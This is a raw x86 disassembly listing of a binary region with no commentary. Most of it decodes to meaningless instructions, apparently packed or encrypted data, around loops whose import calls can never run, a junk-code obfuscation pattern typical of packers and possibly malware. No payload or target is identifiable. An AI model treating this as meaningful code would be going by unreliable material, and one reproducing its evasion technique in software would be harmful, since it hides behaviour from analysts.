  40edd7:	popa   
  40edd8:	inc    ecx
  40edd9:	pop    esi
  40edda:	mov    DWORD PTR [ebx-0x2e96b94a],ecx
  40ede0:	dec    BYTE PTR [ebx-0x7bb4edfc]
  40ede6:	inc    edx
  40ede7:	imul   ecx,DWORD PTR [ecx-0x9],0xed23dc93
  40edee:	sbb    esp,ebp
  40edf0:	jbe    0x40edef
  40edf2:	push   edx
  40edf3:	idiv   DWORD PTR [esi+0x38]
  40edf6:	push   ss
  40edf7:	in     al,dx
  40edf8:	jmp    0x4ca49da0
  40edfd:	mov    ebp,DWORD PTR [ebx+0x1f]
  40ee00:	loope  0x40ee6d
  40ee02:	jp     0x40edd2
  40ee04:	retf   0x2f12
  40ee07:	xchg   esi,eax
  40ee08:	mov    esp,0x305bd341
  40ee0e:	adc    esi,edx
  40ee10:	push   cs
  40ee11:	vmread DWORD PTR [ebp+0x5ee87408],ebx
  40ee18:	add    ah,ah
  40ee1a:	mov    ch,0xa1
  40ee1c:	(bad)  
  40ee1d:	popf   
  40ee1e:	ins    DWORD PTR es:[edi],dx
  40ee1f:	ret    0x4cb
  40ee22:	mov    esi,0xbac036db
  40ee27:	popa   
  40ee28:	or     ch,bl
  40ee2a:	mov    eax,0x231fa5e7
  40ee2f:	sbb    DWORD PTR [edx],edi
  40ee31:	leave  
  40ee32:	dec    eax
  40ee33:	aad    0x42
  40ee35:	pop    ds
  40ee36:	or     al,0x5d
  40ee38:	in     al,0xf4
  40ee3a:	out    dx,eax
  40ee3b:	xchg   ecx,eax
  40ee3c:	mov    esp,0x7c4446b6
  40ee41:	and    BYTE PTR [edi+0x6d29ca73],ah
  40ee47:	mov    bl,0xda
  40ee49:	shr    DWORD PTR [eax+0x1d01ba1f],0x4a
  40ee50:	adc    BYTE PTR [ebx+ebx*8-0x5e6f1e0d],0xbe
  40ee58:	scas   eax,DWORD PTR es:[edi]
  40ee59:	bound  ebx,QWORD PTR gs:[ecx]
  40ee5c:	popa   
  40ee5d:	out    0xd6,al
  40ee5f:	fldenv [edx+eiz*2+0x3b]
  40ee63:	imul   edi,DWORD PTR ds:[ebx+0x2b],0xa59aaa01
  40ee6b:	mov    esp,0xdfbd4c84
  40ee70:	int    0xa3
  40ee72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee73:	shr    BYTE PTR [ecx+0x6856a21],cl
  40ee79:	je     0x40ee66
  40ee7b:	mov    ebx,0x7a9ef008
  40ee80:	fmul   QWORD PTR [ecx+0x33]
  40ee83:	push   esi
  40ee84:	in     eax,dx
  40ee85:	dec    ebx
  40ee86:	icebp  
  40ee87:	fnstcw WORD PTR [ebp+0x224c4939]
  40ee8d:	pushf  
  40ee8e:	ror    DWORD PTR [ecx],cl
  40ee90:	stos   BYTE PTR es:[edi],al
  40ee91:	xor    eax,0x97de764e
  40ee96:	and    esi,DWORD PTR gs:[edi+0x4a]
  40ee9a:	inc    edi
  40ee9b:	into   
  40ee9c:	(bad)  
  40ee9d:	loope  0x40ee64
  40ee9f:	iret   
  40eea0:	lea    esi,[edi]
  40eea2:	daa    
  40eea3:	mov    edx,0xd07383f3
  40eea8:	not    BYTE PTR [eax+eax*1]
  40eeab:	dec    eax
  40eeac:	mov    eax,ds:0x9fb2a11a
  40eeb1:	(bad)  
  40eeb2:	jns    0x40ef11
  40eeb4:	add    bl,al
  40eeb6:	add    DWORD PTR [esi+0x1a],ebp
  40eeb9:	pop    edx
  40eeba:	je     0x40ef20
  40eebc:	adc    eax,0xdd41d429
  40eec1:	push   ebp
  40eec2:	inc    eax
  40eec3:	aam    0x7c
  40eec5:	xor    eax,0xc8c6a2a8
  40eeca:	xchg   BYTE PTR [esi+eax*4-0xdcbe81d],bl
  40eed1:	jno    0x40ee97
  40eed3:	jno    0x40ee8c
  40eed5:	pushf  
  40eed6:	mov    dh,0xa8
  40eed8:	fidiv  WORD PTR [eax+eiz*2]
  40eedb:	push   ss
  40eedc:	sub    ecx,DWORD PTR [ebx]
  40eede:	shr    BYTE PTR [ebp-0x54],1
  40eee1:	mov    bl,0x7b
  40eee3:	push   0xffffff82
  40eee5:	or     BYTE PTR [edx+0x57],bl
  40eee8:	in     al,0x8
  40eeea:	xor    al,0x90
  40eeec:	sbb    dl,bl
  40eeee:	js     0x40eeff
  40eef0:	sbb    ecx,ebx
  40eef2:	push   cs
  40eef3:	push   edx
  40eef4:	lods   eax,DWORD PTR ds:[esi]
  40eef5:	mov    edx,0x66186afa
  40eefa:	cwde   
  40eefb:	fwait
  40eefc:	bound  esi,QWORD PTR [ecx+0x68]
  40eeff:	jmp    0xccb23acb
  40ef04:	inc    eax
  40ef05:	add    eax,0xd6df2b0c
  40ef0a:	or     DWORD PTR [edi+0x59],0xa0ec8082
  40ef11:	retf   0x7ef0
  40ef14:	(bad)  
  40ef15:	fist   DWORD PTR [esi]
  40ef17:	jbe    0x40ef72
  40ef19:	sti    
  40ef1a:	pop    esi
  40ef1b:	repz inc edi
  40ef1d:	push   cs
  40ef1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef1f:	dec    edi
  40ef20:	sub    DWORD PTR [eax],edx
  40ef22:	neg    BYTE PTR [eax-0x4]
  40ef25:	lods   al,BYTE PTR ds:[esi]
  40ef26:	and    eax,0x22621d2e
  40ef2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef2c:	rcr    BYTE PTR [edx],1
  40ef2e:	std    
  40ef2f:	(bad)  
  40ef30:	ss fwait
  40ef32:	adc    ebp,DWORD PTR ds:0xa2de20e5
  40ef38:	xor    esp,edx
  40ef3a:	test   eax,0x704cdd5c
  40ef40:	js     0x40ef09
  40ef42:	repz inc esp
  40ef44:	mov    es,esp
  40ef46:	mov    dl,0x4a
  40ef48:	pop    ebx
  40ef49:	dec    ecx
  40ef4a:	std    
  40ef4b:	or     BYTE PTR [ecx+0x1c7a5fd6],ch
  40ef51:	sbb    BYTE PTR [edi-0x10],dh
  40ef54:	inc    ebx
  40ef55:	inc    edi
  40ef56:	and    esp,DWORD PTR [eax]
  40ef58:	mov    BYTE PTR [eax-0x57f7d6fa],dh
  40ef5e:	inc    eax
  40ef5f:	mov    dh,0x58
  40ef61:	mov    edi,0xcebcbc4a
  40ef66:	and    dh,BYTE PTR [edx-0x25]
  40ef69:	jecxz  0x40efd2
  40ef6b:	push   ebp
  40ef6c:	out    0x22,al
  40ef6e:	mov    al,ds:0x3779af72
  40ef73:	in     al,dx
  40ef74:	sub    edi,DWORD PTR [esi]
  40ef76:	cmp    edi,ebp
  40ef78:	adc    al,0x3b
  40ef7a:	fwait
  40ef7b:	cmp    edi,DWORD PTR [ebx]
  40ef7d:	cmp    DWORD PTR [ebx-0x3d],edi
  40ef80:	out    dx,eax
  40ef81:	mov    cl,0x25
  40ef83:	xchg   esi,eax
  40ef84:	sub    al,0xe0
  40ef86:	sbb    edi,DWORD PTR [esp+edx*2+0x29]
  40ef8a:	xchg   edi,eax
  40ef8b:	add    al,0x52
  40ef8d:	clc    
  40ef8e:	stc    
  40ef8f:	mov    ebp,0x30ecdcef
  40ef94:	ds test eax,0xbd37a03e
  40ef9a:	push   ebp
  40ef9b:	mov    dl,0xb4
  40ef9d:	jne    0x40eff4
  40ef9f:	jne    0x40ef69
  40efa1:	dec    ebx
  40efa2:	mov    eax,ds:0xbdd7ef8d
  40efa7:	pop    esp
  40efa8:	jg     0x40ef33
  40efaa:	retf   
  40efab:	cli    
  40efac:	jae    0x40efe5
  40efae:	and    al,0xd5
  40efb0:	int    0xe4
  40efb2:	shl    DWORD PTR [edx],cl
  40efb4:	call   FWORD PTR [eax-0x4299a537]
  40efba:	stc    
  40efbb:	add    BYTE PTR [edi-0x3bb0dd00],bh
  40efc1:	pop    esp
  40efc2:	fwait
  40efc3:	xchg   edx,eax
  40efc4:	ds xor al,0x7
  40efc7:	and    ch,BYTE PTR [si]
  40efca:	xchg   ecx,eax
  40efcb:	push   ebx
  40efcc:	pop    eax
  40efcd:	(bad)  
  40efce:	ss mov edx,0xa6b0f1fe
  40efd4:	push   DWORD PTR ss:[esi]
  40efd7:	jge    0x40ef85
  40efd9:	sub    DWORD PTR [esi+0x34],0xf8e96b75
  40efe0:	inc    ebx
  40efe1:	fs addr16 out dx,eax
  40efe4:	or     BYTE PTR [esi-0x1f],dl
  40efe7:	lods   al,BYTE PTR ds:[esi]
  40efe8:	shr    BYTE PTR [ebx-0x511c923e],0x76
  40efef:	xor    dh,BYTE PTR [eax+ebp*4+0x148797e6]
  40eff6:	aad    0x13
  40eff8:	sbb    ah,al
  40effa:	xchg   ecx,eax
  40effb:	xchg   esp,eax
  40effc:	jns    0x40efc2
  40effe:	fs push 0x2243ef32
  40f004:	shufps xmm5,xmm2,0x85
  40f008:	push   ecx
  40f009:	dec    ebp
  40f00a:	sbb    eax,0x9e5fdb8e
  40f00f:	into   
  40f010:	stos   DWORD PTR es:[edi],eax
  40f011:	and    BYTE PTR [ebx+0x4b],dl
  40f014:	ret    0x8941
  40f017:	push   ebp
  40f018:	clc    
  40f019:	and    DWORD PTR ds:0x42aa61,0x0
  40f023:	xor    edi,edi
  40f025:	add    edi,DWORD PTR ds:0x42aa61
  40f02b:	inc    edi
  40f02c:	mov    DWORD PTR ds:0x42aa61,edi
  40f032:	cmp    DWORD PTR ds:0x42aa61,0xa
  40f039:	jne    0x40f04a
  40f03f:	push   0x23fa
  40f044:	call   DWORD PTR ds:0x41d0d0
  40f04a:	cmp    DWORD PTR ds:0x42aa61,0x9
  40f051:	jne    0x40f066
  40f057:	xor    edi,edi
  40f059:	or     edi,DWORD PTR ds:0x42aa61
  40f05f:	inc    edi
  40f060:	mov    DWORD PTR ds:0x42aa61,edi
  40f066:	cmp    DWORD PTR ds:0x42aa61,0x10
  40f06d:	jb     0x40f023
  40f073:	and    edi,edi
  40f075:	mov    edx,DWORD PTR [ebp+0x8]
  40f078:	and    DWORD PTR ds:0x42aaed,0x0
  40f082:	mov    edi,DWORD PTR ds:0x42aaed
  40f088:	inc    edi
  40f089:	mov    DWORD PTR ds:0x42aaed,edi
  40f08f:	cmp    DWORD PTR ds:0x42aaed,0x29
  40f096:	jne    0x40f0ac
  40f09c:	push   0x42aa65
  40f0a1:	push   0x4a20
  40f0a6:	call   DWORD PTR ds:0x41d0d4
  40f0ac:	cmp    DWORD PTR ds:0x42aaed,0x1f
  40f0b3:	jb     0x40f082
  40f0b9:	and    DWORD PTR ds:0x42a9b9,0x6b84
  40f0c3:	xor    edx,eax
  40f0c5:	jmp    0x40f34d
  40f0ca:	enter  0xcbc4,0xc2
  40f0ce:	fcmovnb st,st(1)
  40f0d0:	aad    0xda
  40f0d2:	push   cs
  40f0d3:	and    al,0x97
  40f0d5:	cmp    al,0xa7
  40f0d7:	cmp    BYTE PTR [esi-0x3],dh
  40f0da:	into   
  40f0db:	mov    esp,0x7ee57878
  40f0e0:	js     0x40f15a
  40f0e2:	fwait
  40f0e3:	mov    BYTE PTR [ecx+0x47cd7c1],ah
  40f0e9:	das    
  40f0ea:	mov    ecx,0xb3e2f398
  40f0ef:	pop    esp
  40f0f0:	jl     0x40f0bc
  40f0f2:	dec    ecx
  40f0f3:	ror    BYTE PTR [ebx+0x5e],0xc0
  40f0f7:	(bad)  
  40f0f8:	out    dx,eax
  40f0f9:	push   es
  40f0fa:	cli    
  40f0fb:	je     0x40f137
  40f0fd:	cmp    BYTE PTR [edi],ch
  40f0ff:	push   ds
  40f100:	dec    edx
  40f101:	sbb    eax,edi
  40f103:	sbb    al,BYTE PTR [edi]
  40f105:	retf   
  40f106:	gs adc eax,0xa21c10f5
  40f10c:	xor    edx,DWORD PTR [ebx+0x62]
  40f10f:	lahf   
  40f110:	aam    0x86
  40f112:	outs   dx,BYTE PTR ds:[esi]
  40f113:	lods   eax,DWORD PTR ds:[esi]
  40f114:	mov    dl,0x47
  40f116:	jecxz  0x40f0ab
  40f118:	push   eax
  40f119:	or     eax,0xb801cf64
  40f11e:	popa   
  40f11f:	jb     0x40f17d
  40f121:	aad    0x9
  40f123:	iret   
  40f124:	inc    ecx
  40f125:	push   ds
  40f126:	pop    es
  40f127:	(bad)  
  40f128:	clc    
  40f129:	dec    ecx
  40f12a:	ror    BYTE PTR [edi+0x19],1
  40f12d:	or     ecx,esp
  40f12f:	ror    DWORD PTR [ecx],0x8f
  40f132:	into   
  40f133:	aad    0xee
  40f135:	pop    es
  40f136:	retf   
  40f137:	xor    al,0xc0
  40f139:	mov    eax,ds:0x662acba0
  40f13e:	jp     0x40f1a5
  40f140:	inc    edi
  40f141:	jmp    0x40f15f
  40f143:	test   DWORD PTR [esi],edx
  40f145:	adc    eax,0xa8c0d3c3
  40f14a:	cs aas 
  40f14c:	jb     0x40f13b
  40f14e:	in     eax,dx
  40f14f:	push   es
  40f150:	sub    BYTE PTR [ebx-0x7f112082],cl
  40f156:	and    al,0x1d
  40f158:	xor    ah,bl
  40f15a:	pop    eax
  40f15b:	sbb    al,bl
  40f15d:	repz dec ebx
  40f15f:	add    BYTE PTR [ecx+eax*8],bh
  40f162:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f163:	pop    esi
  40f164:	not    cl
  40f166:	aam    0x39
  40f168:	and    DWORD PTR [ecx+0xd1ce671],esp
  40f16e:	pop    eax
  40f16f:	fst    QWORD PTR [edx]
  40f171:	cmp    al,0xa1
  40f173:	mov    ah,0xb
  40f175:	lock retf 
  40f177:	add    edi,DWORD PTR [esi]
  40f179:	jmp    0xd84893fe
  40f17e:	aam    0x68
  40f180:	shld   edx,ebx,0x81
  40f184:	in     al,dx
  40f185:	mov    edx,0xaa322ce1
  40f18a:	and    DWORD PTR [edi],0xffffffb5
  40f18d:	mov    eax,0x66c51615
  40f192:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f193:	dec    edx
  40f194:	cld    
  40f195:	test   BYTE PTR [ecx-0x59],dl
  40f198:	repz add ebx,DWORD PTR [ebx+0x634b000f]
  40f19f:	jecxz  0x40f201
  40f1a1:	cmp    al,0x9e
  40f1a3:	stos   DWORD PTR es:[edi],eax
  40f1a4:	call   0x166d37a8
  40f1a9:	stos   BYTE PTR es:[edi],al
  40f1aa:	loop   0x40f1d5
  40f1ac:	cwde   
  40f1ad:	cmc    
  40f1ae:	fistp  WORD PTR [ebp+0x4d]
  40f1b1:	rcr    BYTE PTR [esi-0x22],1
  40f1b4:	imul   edx,DWORD PTR [edx],0xffffffe9
  40f1b7:	sbb    BYTE PTR [ebp+0x2c],al
  40f1ba:	push   es
  40f1bb:	or     edi,DWORD PTR [ebp-0x3e]
  40f1be:	jl     0x40f18a
  40f1c0:	shl    DWORD PTR [edx-0x6d23b747],cl
  40f1c6:	sti    
  40f1c7:	add    ebx,ebp
  40f1c9:	sub    edx,ecx
  40f1cb:	mov    dl,0x93
  40f1cd:	mov    al,0x5c
  40f1cf:	inc    ebx
  40f1d0:	ds popa 
  40f1d2:	sahf   
  40f1d3:	js     0x40f191
  40f1d5:	rol    BYTE PTR [eax-0x225f20f1],cl
  40f1db:	inc    ecx
  40f1dc:	mov    dl,0x56
  40f1de:	fbld   TBYTE PTR [eax+0x4d]
  40f1e1:	leave  
  40f1e2:	mov    al,ds:0x2d9c4871
  40f1e7:	inc    eax
  40f1e8:	sub    edi,0xee18aa2f
  40f1ee:	rcl    BYTE PTR [eax],0x5d
  40f1f1:	lahf   
  40f1f2:	mov    ecx,0x3936637e
  40f1f7:	imul   edx,DWORD PTR [eax],0x6b
  40f1fa:	leave  
  40f1fb:	pop    ss
  40f1fc:	std    
  40f1fd:	pop    ds
  40f1fe:	rcr    DWORD PTR [ebp+esi*1-0x51],0x44
  40f203:	pop    ds
  40f204:	jp     0x40f258
  40f206:	add    DWORD PTR [edx-0x6],edi
  40f209:	mov    ?,WORD PTR [esp+edi*8]
  40f20c:	fsubr  QWORD PTR [edi+edx*2+0x5b]
  40f210:	mov    al,BYTE PTR [ebp-0x13]
  40f213:	jbe    0x40f268
  40f215:	(bad)  
  40f216:	jg     0x40f26d
  40f218:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f219:	adc    ebp,DWORD PTR gs:[eax+edx*4-0x4f]
  40f21e:	xor    ebp,DWORD PTR [esi]
  40f220:	add    al,0xae
  40f222:	ss mov bl,0x92
  40f225:	mov    esp,0x3a03722
  40f22a:	or     DWORD PTR [ecx+edi*2+0x24c38513],ebx
  40f231:	inc    edx
  40f232:	xchg   esp,eax
  40f233:	mov    dl,0xf3
  40f235:	call   0x10bdb3f5
  40f23a:	ins    BYTE PTR es:[edi],dx
  40f23b:	sbb    al,0xfe
  40f23d:	jbe    0x40f289
  40f23f:	test   eax,0xe861095d
  40f244:	mov    ecx,0xd0339d77
  40f249:	mov    ah,0x9c
  40f24b:	mov    dh,0x46
  40f24d:	jo     0x40f23d
  40f24f:	rcl    edi,cl
  40f251:	(bad)  
  40f252:	std    
  40f253:	push   cs
  40f254:	xchg   edi,eax
  40f255:	(bad)
  40f25a:	into   
  40f25b:	xchg   edi,eax
  40f25c:	sbb    ch,al
  40f25e:	sbb    eax,0x8b31f9cd
  40f263:	mov    DWORD PTR [esi],esp
  40f265:	ins    DWORD PTR es:[edi],dx
  40f266:	arpl   WORD PTR [esi-0x18],bp
  40f269:	xchg   edx,eax
  40f26a:	inc    eax
  40f26b:	pop    eax
  40f26c:	inc    edi
  40f26d:	xchg   ecx,eax
  40f26e:	sub    esp,edx
  40f270:	(bad)  
  40f271:	clc    
  40f272:	clc    
  40f273:	jl     0x40f2ab
  40f275:	retf   
  40f276:	mov    ?,WORD PTR [edx]
  40f278:	jmp    0x40f26b
  40f27a:	sub    BYTE PTR [edx+edx*1-0x66],cl
  40f27e:	add    BYTE PTR [esi+0x629f756e],dl
  40f284:	xlat   BYTE PTR ds:[ebx]
  40f285:	aas    
  40f286:	adc    ah,BYTE PTR [esi-0x11]
  40f289:	retf   0x81a4
  40f28c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f28d:	jmp    0x21a:0x3b20176c
  40f294:	add    al,0x52
  40f296:	call   0x1816:0x1f4bb03c
  40f29d:	jmp    0x308a00e
  40f2a2:	pminub mm1,QWORD PTR [ecx]
  40f2a5:	imul   ecx,edx,0x28
  40f2a8:	dec    eax
  40f2a9:	pop    esp
  40f2aa:	push   ebx
  40f2ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f2ac:	and    eax,0xd549a98a
  40f2b1:	out    dx,al
  40f2b2:	inc    ebx
  40f2b3:	lea    ebx,[ebx+0x64e3ca83]
  40f2b9:	sahf   
  40f2ba:	mov    ds:0xa669b4ca,al
  40f2bf:	dec    edi
  40f2c0:	fnstenv [eax]
  40f2c2:	imul   ecx,DWORD PTR [ebp+0x6369abdc],0xe1fdf1c5
  40f2cc:	fmulp  st(7),st
  40f2ce:	mov    BYTE PTR [eax+edi*2+0x4f],ah
  40f2d2:	sub    eax,0xa80dbbb0
  40f2d7:	fstp   DWORD PTR [esi-0x32]
  40f2da:	cmp    ecx,DWORD PTR [esi-0x18]
  40f2dd:	xor    eax,DWORD PTR ds:0x89704b40
  40f2e3:	inc    esp
  40f2e4:	xor    cl,BYTE PTR [eax+edx*4+0x26]
  40f2e8:	test   al,0x6d
  40f2ea:	sub    al,0xb7
  40f2ec:	jl     0x40f300
  40f2ee:	out    dx,eax
  40f2ef:	das    
  40f2f0:	(bad)
  40f2f3:	xchg   BYTE PTR [ebx-0x72],ah
  40f2f6:	xchg   esi,eax
  40f2f7:	mov    edi,0x15da31e1
  40f2fc:	scas   al,BYTE PTR es:[edi]
  40f2fd:	iret   
  40f2fe:	jecxz  0x40f32b
  40f300:	xchg   ecx,eax
  40f301:	push   eax
  40f302:	sbb    eax,0xd78fdacf
  40f307:	jnp    0x40f28d
  40f309:	daa    
  40f30a:	cmc    
  40f30b:	sbb    BYTE PTR [edi+ebp*8],ch
  40f30e:	ins    DWORD PTR es:[edi],dx
  40f30f:	ins    BYTE PTR es:[edi],dx
  40f310:	les    ebp,FWORD PTR [ebp-0x66557ad0]
  40f316:	out    dx,al
  40f317:	repnz ds int3 
  40f31a:	mov    ah,0xc4
  40f31c:	jmp    0x40f360
  40f31e:	adc    dl,BYTE PTR fs:[ecx]
  40f321:	push   cs
  40f322:	cli    
  40f323:	clc    
  40f324:	iret   
  40f325:	cmp    BYTE PTR [ebx-0x43e8a47c],0xc3
  40f32c:	mov    BYTE PTR [ebp+0x47931593],dh
  40f332:	xor    edi,DWORD PTR [ebx-0x26]
  40f335:	ds or  ebp,edx
  40f338:	(bad)  
  40f339:	out    0x1e,eax
  40f33b:	mov    al,0x23
  40f33d:	and    ecx,DWORD PTR [edi-0x12]
  40f340:	push   ebx
  40f341:	pop    ss
  40f342:	test   eax,0x9e23102e
  40f347:	adc    al,0x12
  40f349:	je     0x40f35f
  40f34b:	or     bl,ah
  40f34d:	add    edx,ecx
  40f34f:	mov    DWORD PTR ds:0x42aa6d,0x1d
  40f359:	cmp    DWORD PTR ds:0x42aa6d,0x0
  40f360:	je     0x40f3c3
  40f366:	cmp    DWORD PTR ds:0x42aa6d,0x7
  40f36d:	jne    0x40f389
  40f373:	push   DWORD PTR [ebp-0x20]
  40f376:	push   DWORD PTR [ebp-0x14]
  40f379:	push   0x7b1d
  40f37e:	push   0x2bb5
  40f383:	call   DWORD PTR ds:0x41d258
  40f389:	cmp    DWORD PTR ds:0x42aa6d,0x8
  40f390:	jne    0x40f3a3
  40f396:	mov    edi,DWORD PTR ds:0x42aa6d
  40f39c:	dec    edi
  40f39d:	mov    DWORD PTR ds:0x42aa6d,edi
  40f3a3:	mov    edi,DWORD PTR ds:0x42aa6d
  40f3a9:	dec    edi
  40f3aa:	mov    DWORD PTR ds:0x42aa6d,edi
  40f3b0:	jmp    0x40f359
  40f3b5:	xor    edi,edi
  40f3b7:	add    edi,DWORD PTR ds:0x42a9b9
  40f3bd:	add    DWORD PTR ds:0x42a9d5,edi
  40f3c3:	mov    DWORD PTR [ebp+0xc],edx
  40f3c6:	xor    edx,DWORD PTR ds:0x42a9c9
  40f3cc:	mov    DWORD PTR [ebp-0x4],0xf89c85d8
  40f3d3:	or     edx,edx
  40f3d5:	mov    DWORD PTR [ebp-0x28],0xf89c853a
  40f3dc:	and    DWORD PTR ds:0x42aaa1,0x0
  40f3e6:	jmp    0x40f3f8
  40f3eb:	mov    edx,DWORD PTR ds:0x42aaa1
  40f3f1:	inc    edx
  40f3f2:	mov    DWORD PTR ds:0x42aaa1,edx
  40f3f8:	cmp    DWORD PTR ds:0x42aaa1,0x12
  40f3ff:	jae    0x40f427
  40f405:	cmp    DWORD PTR ds:0x42aaa1,0x14
  40f40c:	jne    0x40f420
  40f412:	push   0x4578
  40f417:	push   DWORD PTR [ebp-0x14]
  40f41a:	call   DWORD PTR ds:0x41d25c
  40f420:	jmp    0x40f3eb
  40f425:	and    edi,edi
  40f427:	mov    DWORD PTR [ebp-0x2c],0xf89c853b
  40f42e:	sub    edi,DWORD PTR ds:0x42aad9
  40f434:	mov    DWORD PTR [ebp-0x30],0xf89c853c
  40f43b:	and    edi,0x6695
  40f441:	mov    DWORD PTR [ebp-0x34],0xf89c853d
  40f448:	or     DWORD PTR ds:0x42a9d5,0x61f4
  40f452:	mov    DWORD PTR [ebp-0x38],0xf89c853e
  40f459:	and    DWORD PTR ds:0x42aa69,0x0
  40f463:	jmp    0x40f477
  40f468:	xor    edx,edx
  40f46a:	xor    edx,DWORD PTR ds:0x42aa69
  40f470:	inc    edx
  40f471:	mov    DWORD PTR ds:0x42aa69,edx
  40f477:	cmp    DWORD PTR ds:0x42aa69,0x11
  40f47e:	jae    0x40f4ac
  40f484:	cmp    DWORD PTR ds:0x42aa69,0x1a
  40f48b:	jne    0x40f4a7
  40f491:	push   0x1
  40f493:	push   DWORD PTR [ebp-0xc]
  40f496:	push   DWORD PTR [ebp-0x20]
  40f499:	push   0x1352
  40f49e:	push   DWORD PTR [ebp-0x18]
  40f4a1:	call   DWORD PTR ds:0x41d0d8
  40f4a7:	jmp    0x40f468
  40f4ac:	mov    DWORD PTR [ebp-0x3c],0xf89c853f
  40f4b3:	mov    edx,DWORD PTR [ebp+0x8]
  40f4b6:	xor    edx,eax
  40f4b8:	mov    DWORD PTR ds:0x42aa29,0x16
  40f4c2:	cmp    DWORD PTR ds:0x42aa29,0x0
  40f4c9:	je     0x40f553
  40f4cf:	cmp    DWORD PTR ds:0x42aa29,0x21
  40f4d6:	jne    0x40f4f6
  40f4dc:	push   0x6e96
  40f4e1:	push   0x4a9d
  40f4e6:	push   0x2037
  40f4eb:	push   0x3f81
  40f4f0:	call   DWORD PTR ds:0x41d0dc
  40f4f6:	xor    edi,edi
  40f4f8:	or     edi,DWORD PTR ds:0x42aa29
  40f4fe:	dec    edi
  40f4ff:	mov    DWORD PTR ds:0x42aa29,edi
  40f505:	jmp    0x40f4c2
  40f50a:	and    DWORD PTR ds:0x42aaa1,0x0
  40f514:	jmp    0x40f528
  40f519:	xor    edi,edi
  40f51b:	or     edi,DWORD PTR ds:0x42aaa1
  40f521:	inc    edi
  40f522:	mov    DWORD PTR ds:0x42aaa1,edi
  40f528:	cmp    DWORD PTR ds:0x42aaa1,0x1e
  40f52f:	jae    0x40f553
  40f535:	cmp    DWORD PTR ds:0x42aaa1,0x26
  40f53c:	jne    0x40f548
  40f542:	call   DWORD PTR ds:0x41d0e0
  40f548:	jmp    0x40f519
  40f54d:	dec    DWORD PTR ds:0x42aa2d
  40f553:	mov    edi,DWORD PTR [ebp-0x10]
  40f556:	mov    DWORD PTR ds:0x42aa91,0x29a7
  40f560:	jmp    0x40f7e8
  40f565:	(bad)
  40f568:	ret    0xc2d9
  40f56b:	(bad)  
  40f56d:	sar    DWORD PTR [edi],0x6b
  40f570:	shr    ebp,0xdb
  40f573:	xor    DWORD PTR [esi],edi
  40f575:	mov    ebx,0xe5787842
  40f57a:	jle    0x40f5f4
  40f57c:	js     0x40f5d0
  40f57e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f57f:	cmp    dh,BYTE PTR [ebx*1-0x58609586]
  40f586:	xchg   edx,eax
  40f587:	shr    BYTE PTR [ecx+0x5f],0xc4
  40f58b:	das    
  40f58c:	out    dx,eax
  40f58d:	xor    ebx,DWORD PTR [edx+eax*2+0x16]
  40f591:	mov    ds:0x3e400443,al
  40f596:	out    0xa5,al
  40f598:	lods   ax,WORD PTR ds:[esi]
  40f59a:	mov    cl,0x3f
  40f59c:	mov    ds:0x6e13b91f,eax
  40f5a1:	dec    eax
  40f5a2:	mov    ebp,0x8e4384d6
  40f5a7:	int    0xa1
  40f5a9:	dec    esp
  40f5aa:	mov    bl,0x95
  40f5ac:	jg     0x40f598
  40f5ae:	data16 or ch,BYTE PTR [ebp+0x66405967]
  40f5b5:	sub    DWORD PTR [edi+0x1f9c6373],esi
  40f5bb:	shl    DWORD PTR [ebp-0x64e3fba4],1
  40f5c1:	inc    edx
  40f5c2:	mov    ds:0xf39e4555,al
  40f5c7:	test   BYTE PTR [ebx+0x7d],bh
  40f5ca:	push   cs
  40f5cb:	arpl   ax,cx
  40f5cd:	or     al,0xf7
  40f5cf:	push   ecx
  40f5d0:	adc    eax,0xb70d12fc
  40f5d5:	jp     0x40f59e
  40f5d7:	push   esp
  40f5d8:	retf   
  40f5d9:	mov    edi,0x6fe6b627
  40f5de:	mov    al,0xd
  40f5e0:	cdq    
  40f5e1:	fbstp  TBYTE PTR [ecx+0x7d]
  40f5e4:	hlt    
  40f5e5:	iret   
  40f5e6:	push   0x29
  40f5e8:	fcom   DWORD PTR [ecx-0x7ddb8ebc]
  40f5ee:	ss jle 0x40f5d8
  40f5f1:	cmp    al,0x7c
  40f5f3:	sub    DWORD PTR [bp+di+0x13a7],esp
  40f5f8:	aam    0xa1
  40f5fa:	adc    eax,0x9ba43de5
  40f5ff:	jle    0x40f601
  40f601:	pusha  
  40f602:	popf   
  40f603:	das    
  40f604:	push   edi
  40f605:	and    eax,0xb6e1516
  40f60a:	imul   edi,eax,0xffffffd3
  40f60d:	sub    al,0x40
  40f60f:	xlat   BYTE PTR ds:[ebx]
  40f610:	mov    DWORD PTR [esi-0x64],esp
  40f613:	sub    cl,BYTE PTR [esi-0x27]
  40f616:	push   ebp
  40f617:	jmp    0x14d:0x88c34626
  40f61e:	jmp    0x20f2bd31
  40f623:	mov    ch,0xf
  40f625:	and    edi,esi
  40f627:	push   ecx
  40f628:	mov    dh,0x73
  40f62a:	push   ecx
  40f62b:	in     eax,0x6
  40f62d:	std    
  40f62e:	daa    
  40f62f:	mov    ah,0xae
  40f631:	push   eax
  40f632:	mov    cl,0xf7
  40f634:	sbb    eax,0xb6ca097b
  40f639:	pusha  
  40f63a:	mov    DWORD PTR [eax+0x2f],edi
  40f63d:	out    0x39,al
  40f63f:	into   
  40f640:	cmp    BYTE PTR [ecx-0x238d107a],bh
  40f646:	das    
  40f647:	mov    ebp,DWORD PTR [ebx]
  40f649:	(bad)  
  40f64a:	jmp    DWORD PTR [ecx-0x57a111f2]
  40f650:	jmp    0x40f657
  40f652:	push   ebx
  40f653:	jecxz  0x40f6a8
  40f655:	ins    DWORD PTR es:[edi],dx
  40f656:	and    al,0x55
  40f658:	mov    esi,0x362e4767
  40f65d:	loope  0x40f613
  40f65f:	xor    edi,DWORD PTR [esi+0x4a88f0eb]
  40f665:	out    dx,al
  40f666:	xlat   BYTE PTR ds:[ebx]
  40f667:	cwde   
  40f668:	enter  0xb06e,0x71
  40f66c:	push   edx
  40f66d:	sub    eax,0xee799d07
  40f672:	mov    bl,0x83
  40f674:	ror    DWORD PTR [edi],0x2e
  40f677:	inc    ecx
